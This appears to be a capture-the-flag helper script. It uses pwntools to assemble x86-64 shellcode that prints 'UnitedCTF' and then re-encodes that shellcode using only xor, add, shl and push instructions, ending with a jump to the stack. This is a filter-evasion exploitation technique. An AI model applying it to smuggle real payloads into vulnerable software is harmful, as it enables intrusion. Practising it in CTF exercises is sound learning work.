from collections import Counter

from pwnlib.asm import asm
from pwnlib.shellcraft import amd64
# Shellcode to execute
print(amd64.pushstr(b"Popcorn") + amd64.linux.write(1, "rsp", 8))
print(''.join(['\\x{:02x}'.format(x) for x in asm(amd64.pushstr(b"Popcorn") + amd64.linux.write(1, "rsp", 8),arch="amd64")]))

code = '''
BITS 64 
push 0x46
mov r10, 0x5443646574696e55
push r10
push 1
pop rdi
push 9
pop rdx
push rsp
pop rsi
push 1
pop rax
syscall
'''  
# Compiled with nasm to obtain bytes 6a4649ba556e69746564435441526a015f6a095a545e6a01580f05

#Shellcode bytes, inverted endianness and in order of the stack
x = ["050f58","016a5e545a096a5f","016a524154436465","74696e55ba49466a"]

#Generating the shellcode using only xor, add, shl and push instructions
max_l = 0xA
l_3 = 0x8
l_2 = 0x6
l_1 = 0x4
l_0 = 0x2

s = ''
xor = "xor rcx, rcx\n"
add1 = "add rcx, 0x1\n"
add2 = "add rcx, 0x2\n"
add3 = "add rcx, 0x4\n"
add4 = "add rcx, 0x6\n"
add5 = "add rcx, 0x8\n"
add6 = "add rcx, 0xA\n"
shl = "shl rcx,4\n"
push = "push rcx\n"
s += xor
for idx,i in enumerate(x):
    for y in range(len(i)):
        current_num = int(i[y], 16)
        s += add6 * (current_num // max_l) + add5 * ((current_num%max_l) // l_3) + add4 * (((current_num%max_l) % l_3) // l_2) + add3 * ((((current_num%max_l) % l_3) % l_2) // l_1) + add2 * (((((current_num%max_l) % l_3) % l_2) % l_1) // l_0) + add1 * (((((current_num%max_l) % l_3) % l_2) % l_1) % l_0)
        if(y != len(i)-1):
            s += shl
    s += push
    s += xor
s += "jmp rsp\n"

r = asm(s, arch="amd64")

s = ''.join(['\\\\x{:02x}'.format(x) for x in r])

# bytes
print(s)
# number of bytes
print(len(s.split('\\\\x')))
# number of different bytes
print(len(Counter(s.split('\\\\x')).keys()))
# different bytes
print(Counter(s.split('\\\\x')).keys())